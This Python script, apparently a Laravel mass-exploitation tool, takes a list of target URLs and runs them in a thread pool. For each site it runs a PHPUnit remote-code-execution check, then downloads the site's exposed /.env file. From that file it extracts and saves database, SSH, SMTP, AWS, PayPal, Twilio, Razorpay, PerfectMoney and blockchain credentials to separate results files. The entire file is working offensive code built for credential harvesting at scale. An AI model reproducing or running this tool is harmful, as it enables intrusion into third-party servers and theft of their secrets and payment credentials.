#!/usr/bin/python
# ------
# https://github.com/404rgr/Laravel_Exploit
# Disclaimer: https://pastebin.com/5BLNidpT
# ------
# Version 2.0
# Coder: Zeerx7
# Website: zone-xsec.com
# -------------

import requests
from re import search
from requests import get
from lib.color import *
from lib.phpunit import phpunit
from lib.banner import banner
from platform import python_version
from multiprocessing.dummy import Pool as ThreadPool

phpunit_rce = phpunit()
class Tools:
    def __init__(self):
        self.timeout = 15
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
        }
        self.python_version = python_version()
    #@fn_timer
    def Run(self, url):
        if url:
            url = self.fix_url(url)

            # phpunit rce
            rce = phpunit_rce.exploit(url)
            if rce == True:
                print('{}{} : [PHPUNIT RCE: VULN]'.format(green, url))
            else:
                print('{}{} : [PHPUNIT RCE: NOT VULN]'.format(red, url))

            # Get Env
            url_env = url+'/.env'
            try:
                req = get(url_env, headers=self.headers, timeout=self.timeout)
                if req.status_code == 200:
                    self.FetchEnv(url, req)
                else:
                    print('{}{} >> Don\'t Have .env'.format(red, url))
            except requests.exceptions.ConnectionError:
                print('{}{} >> Error Connection'.format(red, url))
            except Exception as e:
                # print (e)
                pass
    # @fn_timer
    def FetchEnv(self, url, res):
        url = url
        raw = res.text
        result = []

        if 'APP_' in raw:
            # Get Env
            s = []
            s.append(search('APP_NAME=(.+)\r\n', raw))
            s.append(search('APP_ENV=(.+)\r\n', raw))
            s.append(search('APP_KEY=(.+)\r\n', raw))
            s.append(search('APP_DEBUG=(.+)\r\n', raw))
            s.append(search('APP_LOG_LEVEL=(.+)\r\n', raw))
            s.append(search('APP_URL=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='app_env', must_there='APP_NAME', save_filename='app_env.txt'))

        if 'MAIL_' in raw:
            # Get Mailer
            s = []
            s.append(search('MAIL_DRIVER=(.+)\r\n', raw))
            s.append(search('MAIL_HOST=(.+)\r\n', raw))
            s.append(search('MAIL_PORT=(.+)\r\n', raw))
            s.append(search('MAIL_USERNAME=(.+)\r\n', raw))
            s.append(search('MAIL_PASSWORD=(.+)\r\n', raw))
            s.append(search('MAIL_ENCRYPTION=(.+)', raw))
            s.append(search('MAIL_FROM_ADDRESS=(.+)', raw))
            s.append(search('MAIL_FROM_NAME=(.+)', raw))
            result.append(self.dis(url, s, type='mail', must_there='MAIL_HOST', save_filename='smtp.txt'))

        if 'SSH_' in raw:
            # Get SSH
            s = []
            s.append(search('SSH_HOST=(.+)\r\n', raw))
            s.append(search('SSH_USERNAME=(.+)\r\n', raw))
            s.append(search('SSH_PASSWORD=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='ssh', must_there='SSH_HOST', save_filename='ssh.txt'))

        if 'DB_' in raw:
            # Get Database
            s = []
            s.append(search('DB_CONNECTION=(.+)\r\n', raw))
            s.append(search('DB_HOST=(.+)\r\n', raw))
            s.append(search('DB_PORT=(.+)\r\n', raw))
            s.append(search('DB_DATABASE=(.+)\r\n', raw))
            s.append(search('DB_USERNAME=(.+)\r\n', raw))
            s.append(search('DB_PASSWORD=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='db', must_there='DB_HOST', save_filename='db.txt'))

        if 'TWILIO' in raw:
            # Get Twilio
            s = []
            s.append(search('TWILIO_ACCOUNT_SID=(.+)\r\n', raw))
            s.append(search('TWILIO_API_KEY=(.+)\r\n', raw))
            s.append(search('TWILIO_API_SECRET=(.+)\r\n', raw))
            s.append(search('TWILIO_CHAT_SERVICE_SID=(.+)\r\n', raw))
            s.append(search('TWILIO_AUTH_TOKEN=(.+)\r\n', raw))
            s.append(search('TWILIO_NUMBER=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='twilio', must_there='TWILIO_ACCOUNT_SID', save_filename='twilio.txt'))

        if 'BLOCKCHAIN_' in raw:
            # Get Btc
            s = []
            s.append(search('BLOCKCHAIN_API=(.+)\r\n', raw))
            s.append(search('DEFAULT_BTC_FEE=(.+)\r\n', raw))
            s.append(search('TRANSACTION_BTC_FEE=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='btc', must_there='BLOCKCHAIN_API', save_filename='btc.txt'))

        if 'PM_' in raw:
            # Get Perfectmoney
            s = []
            s.append(search('PM_ACCOUNTID=(.+)\r\n', raw))
            s.append(search('PM_PASSPHRASE=(.+)\r\n', raw))
            s.append(search('PM_CURRENT_ACCOUNT=(.+)\r\n', raw))
            s.append(search('PM_MARCHANTID=(.+)\r\n', raw))
            s.append(search('PM_MARCHANT_NAME=(.+)\r\n', raw))
            s.append(search('PM_UNITS=(.+)\r\n', raw))
            s.append(search('PM_ALT_PASSPHRASE=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='perfectmoney', must_there='PM_ACCOUNTID', save_filename='perfectmoney.txt'))

        if 'AWS_' in raw:
            # Get AWS
            s = []
            s.append(search('AWS_ACCESS_KEY=(.+)\r\n', raw))
            s.append(search('AWS_SECRET=(.+)\r\n', raw))
            s.append(search('AWS_ACCESS_KEY_ID=(.+)\r\n', raw))
            s.append(search('AWS_SECRET_ACCESS_KEY=(.+)\r\n', raw))
            s.append(search('AWS_S3_KEY=(.+)\r\n', raw))
            s.append(search('AWS_BUCKET=(.+)\r\n', raw))
            s.append(search('AWS_SES_KEY=(.+)\r\n', raw))
            s.append(search('AWS_SES_SECRET=(.+)\r\n', raw))
            s.append(search('SES_KEY=(.+)\r\n', raw))
            s.append(search('SES_SECRET=(.+)\r\n', raw))
            s.append(search('AWS_REGION=(.+)\r\n', raw))
            s.append(search('AWS_DEFAULT_REGION=(.+)\r\n', raw))
            s.append(search('SES_USERNAME=(.+)\r\n', raw))
            s.append(search('SES_PASSWORD=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='aws', must_there='AWS_ACCESS_KEY_ID', save_filename='aws.txt'))

        if 'PLIVO_' in raw:
            # Get Plivo
            s = []
            s.append(search('PLIVO_AUTH_ID=(.+)\r\n', raw))
            s.append(search('PLIVO_AUTH_TOKEN=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='plivo', must_there='PLIVO_AUTH_ID', save_filename='plivo.txt'))

        if 'NEXMO_' in raw:
            # Get Nexmo
            s = []
            s.append(search('NEXMO_KEY=(.+)\r\n', raw))
            s.append(search('NEXMO_SECRET=(.+)\r\n', raw))
            s.append(search('NEXMO_NUMBER=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='nexmo', must_there='NEXMO_KEY', save_filename='nexmo.txt'))

        if 'RAZORPAY_' in raw:
            # Get Razorpay
            s = []
            s.append(search('RAZORPAY_KEY=(.+)\r\n', raw))
            s.append(search('RAZORPAY_SECRET=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='razorpay', must_there='RAZORPAY_KEY', save_filename='razorpay.txt'))

        if 'PAYPAL_' in raw:
            # Get Paypal
            s = []
            s.append(search('PAYPAL_CLIENT_ID=(.+)\r\n', raw))
            s.append(search('PAYPAL_SECRET=(.+)\r\n', raw))
            s.append(search('PAYPAL_MODE=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='paypal', must_there='PAYPAL_CLIENT_ID', save_filename='paypal.txt'))

        self.print_result(url, result)

    def dis(self, url, data, type, must_there='', save_filename='default.txt'):
            tmp = []
            if data:
                must_there = must_there
                for x in data:
                    if x:tmp.append(x.group(0).strip())
                if tmp and must_there in '|'.join(tmp):
                    self.save('results/'+save_filename, url+'\n'+('\n'.join(tmp))+'\n\n')
                    return type
    def input(self, string):
        if self.python_version[0] == '2':
            return raw_input(string)
        else:
            return input(string)
    def print_result(self, url, data):
        there = []
        for x in data:
            if x:there.append(x)
        if there:
            self.save('results/env.txt', url+'\n')
            there.append('env')
            print('{}{} : Get [{}]'.format(green, url, '|'.join(there)))
        else:
            print('{} : Bad .env'.format(red, url))
        # print (url, data)
    def fix_url(self, url):
        if not search('^http(s)?://', url):
            url = 'http://'+url
        split = url.split('/')
        url = split[0]+'//'+split[2]
        return url
    def save(self, filename, isi):
        with open(filename, 'a') as sv:
            sv.write(isi)

if __name__ == '__main__':
    try:
        print(banner)
        x = Tools()
        listname = x.input("{}Urls List: {}".format(yellow, cyan))
        urls = open(listname, 'r').read().splitlines()
        thread   = input("{}Thread: {}".format(yellow, cyan))

        print('\n')
        if urls:
            pool = ThreadPool(int(thread))
            pool.map(x.Run, urls)
            pool.close()
            pool.join()
            print("\n{}[ END ]{}".format(green, end))
    except Exception as e:
        print(e)
